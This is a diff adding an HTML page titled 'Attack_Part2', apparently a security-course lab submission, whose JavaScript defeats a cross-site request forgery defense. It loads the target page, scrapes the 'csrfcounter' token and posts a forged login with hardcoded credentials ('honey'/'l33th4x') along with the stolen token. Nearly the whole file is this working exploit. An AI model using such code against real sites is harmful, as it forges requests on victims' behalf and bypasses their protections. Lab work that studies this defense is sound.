@@ -1,0 +1,66 @@
+<html>
+	<body>
+		<title>Attack_Part2::Part2</title>
+			<script type="text/javascript">
+				var xhr;
+
+			    function getPage(uri, callback) {
+				    xhr = new XMLHttpRequest();
+				    if (xhr.overrideMimeType) {
+				    	xhr.overrideMimeType('text/html');
+				    }
+				    xhr.onreadystatechange = callback;
+				    xhr.open('GET', uri, true);
+				    xhr.send(null);
+				}
+
+				getPage('/?csrfdefense=1', getCurrentCounter);
+
+				  function getCurrentCounter() {
+						if (xhr.readyState == 4) {
+		      				if (xhr.status == 200) {
+		        				document.write(xhr.responseText);
+		      					var counter = document.getElementById('csrfcounter').value;
+		      					// At this point, we have the csrf counter
+		      					// document.write('csrfcounter is ');
+		      					// document.write(counter);
+
+		      					// Log the user in with 'honey' and 'l33th4x' and the csrfcounter as appropriate
+								var encoded_user = encodeURIComponent('honey');
+								var encoded_password = encodeURIComponent('l33th4x');
+								var encoded_sqlfilter = encodeURIComponent('0');
+								var login_action = 'login';
+								var login_string = 'user=' + encoded_user + '&password=' +
+								          encoded_password + '&login_action=' + login_action +
+									            '&sqlfilter=' + encoded_sqlfilter;
+								var encoded_csrfcounter = encodeURIComponent(counter);
+				      			if (encoded_csrfcounter) {
+			        				login_string += '&csrfcounter=' + encoded_csrfcounter;
+			      				} 
+
+								var post_destination = '/login?csrfdefense=1';
+						        postForm(post_destination, login_string, getCurrentCounter, 'POST');
+		      				} else {
+		          				alert('There was a network problem with the login form.');
+		        			}
+      				}
+				}
+
+				function postForm(uri, parameters, callback, type) {
+					document.body.innerHTML = '';
+					xhr = new XMLHttpRequest();
+					if (xhr.overrideMimeType) {
+						xhr.overrideMimeType('text/html');
+					}
+					xhr.onreadystatechange = callback;
+					xhr.open(type, uri, true);
+					xhr.setRequestHeader('Content-type', 
+							'application/x-www-form-urlencoded');
+					xhr.setRequestHeader('Content-length', parameters.length);
+					xhr.setRequestHeader('Connection', close);
+					xhr.send(parameters);
+				}
+
+		</script>
+	</body>
+</html>
